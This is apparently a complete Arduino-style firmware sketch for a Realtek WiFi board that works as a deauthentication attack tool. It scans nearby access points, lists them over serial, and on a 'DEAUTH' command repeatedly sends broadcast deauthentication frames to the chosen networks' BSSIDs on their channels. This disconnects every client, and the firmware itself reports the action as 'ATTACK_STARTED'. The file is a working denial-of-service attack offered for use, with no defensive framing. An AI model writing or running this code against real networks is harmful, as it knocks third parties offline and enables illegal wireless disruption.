#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"

#define MAX_NETWORKS 32

typedef struct {
  String ssid;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;

WiFiScanResult scan_results[MAX_NETWORKS];
int scan_count = 0;
int deauth_indices[MAX_NETWORKS];
int deauth_count = 0;

int frames_per_deauth = 5;
int send_delay = 5;
bool isDeauthing = false;
int current_target = 0;

void serialOut(String msg) {
  Serial.println(msg);
}

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete == 0 && scan_count < MAX_NETWORKS) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;

    WiFiScanResult &res = scan_results[scan_count++];
    res.ssid = String((const char *)record->SSID.val);
    res.channel = record->channel;
    res.rssi = record->signal_strength;
    memcpy(res.bssid, record->BSSID.octet, 6);

    char bssid_str[20];
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             res.bssid[0], res.bssid[1], res.bssid[2],
             res.bssid[3], res.bssid[4], res.bssid[5]);

    Serial.print("SCAN_RESULT SSID=\"");
    Serial.print(res.ssid);
    Serial.print("\" BSSID=\"");
    Serial.print(bssid_str);
    Serial.print("\" RSSI=");
    Serial.print(res.rssi);
    Serial.print(" CH=");
    Serial.println(res.channel);
  }
  return RTW_SUCCESS;
}

void scanNetworks() {
  scan_count = 0;

  // LED: Green = Scanning
  digitalWrite(LED_R, LOW);
  digitalWrite(LED_G, HIGH);
  digitalWrite(LED_B, LOW);

  if (wifi_is_ready_to_transceive(RTW_STA_INTERFACE) != RTW_SUCCESS) {
    wifi_on(RTW_MODE_STA);
    delay(100);
  }

  wifi_scan_networks(scanResultHandler, NULL);
  delay(5000);
  Serial.println("DONE");

  // LED: Red = Standby
  digitalWrite(LED_R, HIGH);
  digitalWrite(LED_G, LOW);
}

void parseCommand(String cmd) {
  cmd.trim();

  if (cmd == "SCAN") {
    scanNetworks();
  } else if (cmd.startsWith("DEAUTH")) {
    deauth_count = 0;
    cmd = cmd.substring(7);
    while (cmd.length() > 0 && deauth_count < MAX_NETWORKS) {
      int comma = cmd.indexOf(',');
      String idx_str = (comma >= 0) ? cmd.substring(0, comma) : cmd;
      int idx = idx_str.toInt();
      if (idx >= 0 && idx < scan_count) {
        deauth_indices[deauth_count++] = idx;
      }
      if (comma < 0) break;
      cmd = cmd.substring(comma + 1);
    }
    if (deauth_count > 0) {
      isDeauthing = true;
      Serial.println("ATTACK_STARTED");
    }
  } else if (cmd == "STOP") {
    isDeauthing = false;
    Serial.println("ATTACK_STOPPED");

    // LED: Red = Standby
    digitalWrite(LED_B, LOW);
    digitalWrite(LED_G, LOW);
    digitalWrite(LED_R, HIGH);
  } else if (cmd.startsWith("SET FRAMES")) {
    frames_per_deauth = cmd.substring(11).toInt();
  } else if (cmd.startsWith("SET DELAY")) {
    send_delay = cmd.substring(10).toInt();
  }
}

void setup() {
  Serial.begin(115200);

  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  // Default: Red (idle)
  digitalWrite(LED_R, HIGH);
  digitalWrite(LED_G, LOW);
  digitalWrite(LED_B, LOW);

  Serial.println("READY");

  wifi_on(RTW_MODE_STA);
  scanNetworks();
}

void loop() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    parseCommand(cmd);
  }

  if (isDeauthing && deauth_count > 0) {
    WiFiScanResult &target = scan_results[deauth_indices[current_target]];
    wext_set_channel(WLAN0_NAME, target.channel);

    for (int i = 0; i < frames_per_deauth; i++) {
      digitalWrite(LED_B, HIGH);  // Blue ON during attack
      wifi_tx_deauth_frame(target.bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
      delay(send_delay);
      digitalWrite(LED_B, LOW);
      delay(5);
    }

    current_target = (current_target + 1) % deauth_count;
  }
}
